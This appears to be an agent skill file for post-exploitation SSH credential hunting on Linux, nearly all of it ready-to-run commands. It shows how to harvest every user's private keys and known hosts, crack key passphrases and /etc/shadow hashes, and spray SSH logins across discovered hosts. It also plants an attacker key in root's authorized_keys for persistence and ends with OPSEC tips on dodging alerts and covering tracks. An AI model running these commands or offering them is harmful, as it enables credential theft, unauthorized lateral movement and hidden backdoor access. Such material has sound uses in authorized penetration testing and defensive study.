---
name: ssh-key-scanner
description: "Auth/lab ref: SSH key exposure audit; private keys, authorized_keys, cloud config, host/user access evidence and remediation."
license: MIT
compatibility: "Linux; Bash shell script; No dependencies."
metadata:
  author: AeonDave
  version: "1.0"
---

# SSH Key Scanner

Post-exploitation SSH credential hunting — finds private keys, authorized_keys, cloud credentials, and known_hosts for lateral movement.

## Quick Start

```bash
# Hunt current user's SSH keys
find ~/.ssh -type f -readable 2>/dev/null

# Hunt all users' SSH keys (requires root)
find /home -name ".ssh" -type d 2>/dev/null | while read dir; do echo "=== $dir ==="; ls -la "$dir" 2>/dev/null; done

# Check for SSH configs (hosts, keys, passwords)
cat ~/.ssh/config 2>/dev/null

# Extract hosts from known_hosts
cut -d' ' -f1 ~/.ssh/known_hosts 2>/dev/null | cut -d',' -f1
```

## Key Targets

### Current User SSH Keys

```bash
# Private keys (id_rsa, id_ed25519, etc)
ls -la ~/.ssh/

# Readable keys (check permissions!)
find ~/.ssh -type f -perm /644 2>/dev/null

# Keys by type
ls -la ~/.ssh/id_* 2>/dev/null

# Non-standard keys
find ~/.ssh -type f ! -name "*.pub" ! -name "config" ! -name "known_hosts" 2>/dev/null
```

### All Users' SSH Keys (root only)

```bash
# Enumerate home directories
for user in $(cat /etc/passwd | cut -d: -f1); do
    echo "=== $user ==="
    [ -d "/home/$user/.ssh" ] && ls -la "/home/$user/.ssh" 2>/dev/null || echo "No .ssh"
done

# Or find all .ssh directories
find /home /root -name ".ssh" -type d 2>/dev/null
```

### Authorized Keys (Who can SSH into this system?)

```bash
# Current user
cat ~/.ssh/authorized_keys 2>/dev/null

# All users (root)
for user in $(cat /etc/passwd | cut -d: -f1); do
    [ -f "/home/$user/.ssh/authorized_keys" ] && echo "=== $user ===" && cat "/home/$user/.ssh/authorized_keys" 2>/dev/null
done

# Extract remote user@host pairs
grep -h "^.*@" ~/.ssh/authorized_keys 2>/dev/null | awk '{print $(NF-1), $NF}' | sort -u
```

### SSH Config (What hosts can user access?)

```bash
# Current user's SSH config
cat ~/.ssh/config 2>/dev/null

# Parse hosts from config
grep "^Host " ~/.ssh/config 2>/dev/null | awk '{print $2}'

# Extract connection details
grep -E "User|HostName|Port|Identity" ~/.ssh/config 2>/dev/null
```

### Known Hosts (Where has user connected before?)

```bash
# Extract hostnames from known_hosts
cat ~/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | cut -d',' -f1 | sort -u

# Decoded (useful for pivoting)
# Format: [IP|HOSTNAME]:PORT SSH_KEY_TYPE PUBKEY HASH
```

### System-wide SSH (root only)

```bash
# Root's SSH keys
ls -la /root/.ssh/ 2>/dev/null

# Service account SSH keys
find /opt -name ".ssh" -type d 2>/dev/null
find /var -name ".ssh" -type d 2>/dev/null

# Privilege escalation path: if service account has SSH key to admin host
```

## Cloud Credentials in SSH Config

SSH configs sometimes contain:

```bash
# Check for hardcoded passwords (bad practice but happens)
grep -i password ~/.ssh/config 2>/dev/null

# Check for cloud metadata / API keys in ProxyCommand
grep ProxyCommand ~/.ssh/config 2>/dev/null
```

## Lateral Movement with Found Keys

### Direct SSH (no password needed)

```bash
# Test if key works
ssh -i ~/.ssh/id_rsa user@target.com

# If key has password, try to crack
john --wordlist=/usr/share/wordlists/rockyou.txt <(ssh-keygen -p -f ~/.ssh/id_rsa -m pem -p pem)
```

### SSH Jump Host (proxying through compromised system)

```bash
# If you found a key to host-a, and host-a has access to host-b:
ssh -i ~/.ssh/id_rsa -J user@host-a user@host-b
```

### Automated SSH Enumeration

```bash
# Loop through all found hosts, try connection
for host in $(cat ~/.ssh/known_hosts | cut -d' ' -f1 | cut -d',' -f1 | sort -u); do
    echo "[*] Testing SSH to $host"
    timeout 3 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$host" "whoami" 2>/dev/null
done
```

## Key Types & Strengths

| Key Type | Format | Strength |
|---|---|---|
| **RSA** | id_rsa | 2048/4096-bit standard |
| **ED25519** | id_ed25519 | 256-bit, modern, recommended |
| **ECDSA** | id_ecdsa | 256/384/521-bit, less common |
| **DSA** | id_dsa | Deprecated, weak |

## Credential Material Beyond Keys

### /etc/shadow (password hashes, root only)

```bash
# Extract password hashes
cat /etc/shadow | cut -d: -f1,2

# Try to crack
john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow
```

### Cached SSH Passphrases (ssh-agent)

```bash
# List loaded keys
ssh-add -l

# Try to extract (requires ssh-agent key dump tools)
# This is process-memory based, requires specific techniques
```

### Shell History (bash, zsh, etc)

```bash
# SSH commands in history
grep "ssh " ~/.bash_history | head -20
grep "ssh " ~/.zsh_history | head -20

# Extract destination hosts
grep "ssh " ~/.bash_history | awk '{print $NF}' | sort -u
```

## Persistence via SSH Key Injection

After privilege escalation:

```bash
# Add your SSH key to root's authorized_keys
echo "ssh-rsa AAAA...your_public_key attacker@home" >> /root/.ssh/authorized_keys

# Or target user's authorized_keys (lateral movement prep)
echo "ssh-rsa AAAA...your_public_key" >> /home/target/.ssh/authorized_keys
chown target:target /home/target/.ssh/authorized_keys
chmod 600 /home/target/.ssh/authorized_keys
```

## Full Enumeration Script

```bash
#!/bin/bash
# Hunt all SSH material

echo "[*] SSH Key Enumeration"

# Current user
echo "[+] Current User Keys"
find ~/.ssh -type f 2>/dev/null

# All users (if root)
if [ $EUID -eq 0 ]; then
    echo "[+] All Users' SSH"
    for user in $(cat /etc/passwd | cut -d: -f1); do
        [ -d "/home/$user/.ssh" ] && find "/home/$user/.ssh" -type f 2>/dev/null
    done
fi

# Known hosts
echo "[+] Known Hosts"
cat ~/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | sort -u

# SSH config
echo "[+] SSH Config"
grep "^Host\|User\|HostName" ~/.ssh/config 2>/dev/null
```

## Integration with Other Tools

| Tool | Use |
|---|---|
| **pwncat** | Auto-finds SSH keys on target |
| **LinPEAS** | Includes SSH key discovery in enumeration |
| **scp** | Copy found keys to attacker machine |
| **ssh-keyscan** | Identify SSH services on found hosts |

## OPSEC Considerations

- ⚠️ Reading ssh keys logs to system logs (depends on umask)
- ⚠️ SSH connections create entries in /var/log/auth.log
- ✅ Authorized_keys modifications may not trigger alerts if file perms match
- ✅ Key reuse between systems → cover tracks on all systems

## Resources

| File | When to load |
|---|---|
| `references/` | SSH key cracking, advanced persistence, multi-hop proxying |
